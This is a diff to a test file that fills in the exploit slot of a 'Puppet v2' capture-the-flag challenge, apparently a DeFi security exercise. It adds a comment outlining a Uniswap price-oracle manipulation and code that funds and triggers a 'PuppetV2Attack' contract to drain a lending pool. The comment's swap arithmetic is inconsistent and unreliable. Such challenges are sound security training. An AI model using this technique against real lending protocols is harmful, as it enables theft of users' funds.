@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -82,6 +83,50 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /**
+         * Attack Scenario:
+         *  -> We will manipulate the borrow function again. 
+         *  -> Drain the pair, such that amountA.mul(reserveB) / reserveA == 0.
+         *  -> Only way, since there is a integer division, amountA.mul(reserveB)  < reserveA 
+         *  -> In the uniswap pair, current situation is 10 WETH/100 TOKEN.
+         *  -> Attacker has 10000 TOKEN.
+         *  -> Swap 100 TOKEN for 10 WETH.
+         *  -> Uniswap Pair now has 0 WETH/200 TOKEN.
+         *  -> Quote will return amountA*0(WETH_Amount)/200 == 0.
+         *  -> Borrow with 0 value. 
+         *  -> Attack is complete.
+         */
+
+        const PoolV2AttackFactory = await ethers.getContractFactory('PuppetV2Attack',attacker);
+        this.attackContract =  await PoolV2AttackFactory.deploy(
+            this.weth.address,
+            this.token.address,
+            this.uniswapRouter.address,
+            this.lendingPool.address
+        )
+
+        const depositInAmount = ATTACKER_INITIAL_TOKEN_BALANCE; // Give 10000 TOKEN to the POOL. 
+        const depositOutAmount =ethers.utils.parseEther("9.8") ; // Expect >9.8 ETH.
+        const targetAmount = POOL_INITIAL_TOKEN_BALANCE;        // This is the amount we want to steal.
+        
+        //transfer, wrap
+        await this.token.connect(attacker).transfer(this.attackContract.address,depositInAmount);
+        const tx = {
+            from:attacker.address,
+            to: this.weth.address,
+            value:ethers.utils.parseEther("19.9"),
+        }
+        await attacker.sendTransaction(tx);
+
+        await this.weth.connect(attacker).transfer(
+            this.attackContract.address,
+            ethers.utils.parseEther("19.85")
+        );
+        await this.attackContract.connect(attacker).attack(
+            depositInAmount,
+            depositOutAmount,
+            targetAmount
+        );
     });
 
     after(async function () {
